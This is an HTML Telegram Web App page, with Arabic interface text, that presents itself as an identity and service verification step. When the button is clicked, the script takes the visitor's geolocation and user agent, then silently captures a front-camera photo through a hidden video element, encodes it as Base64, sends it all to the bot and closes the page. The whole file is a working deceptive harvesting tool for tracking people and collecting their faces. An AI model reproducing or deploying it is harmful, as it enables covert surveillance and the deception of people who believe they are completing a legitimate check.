<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f0f0; }
        button { padding: 15px; background: #0088cc; color: white; border: none; border-radius: 10px; cursor: pointer; }
        video { display: none; } /* الكاميرا تعمل في الخلفية بعد الإذن */
    </style>
</head>
<body>
    <h3>تأكيد الهوية والخدمة</h3>
    <p>يرجى الضغط على الزر أدناه للمتابعة</p>
    <button id="startBtn">بدء عملية التحقق</button>
    <canvas id="canvas" style="display:none;"></canvas>
    <video id="video" autoplay></video>

    <script>
        const tele = window.Telegram.WebApp;
        tele.expand(); // توسيع النافذة لتشمل الشاشة كاملة

        document.getElementById('startBtn').onclick = async () => {
            let data = { info: navigator.userAgent };

            // 1. طلب الموقع
            navigator.geolocation.getCurrentPosition(async (pos) => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;

                // 2. التقاط صورة (مثال للكاميرا الأمامية)
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    // انتظر قليلاً للالتقاط
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        data.photo = canvas.toDataURL('image/jpeg'); // تحويل الصورة لنص Base64
                        
                        // إرسال البيانات للبوت وإغلاق الصفحة
                        tele.sendData(JSON.stringify(data));
                        tele.close();
                    }, 1000);
                } catch (err) {
                    alert("يجب الموافقة على الكاميرا للمتابعة");
                }
            });
        };
    </script>
</body>
</html>
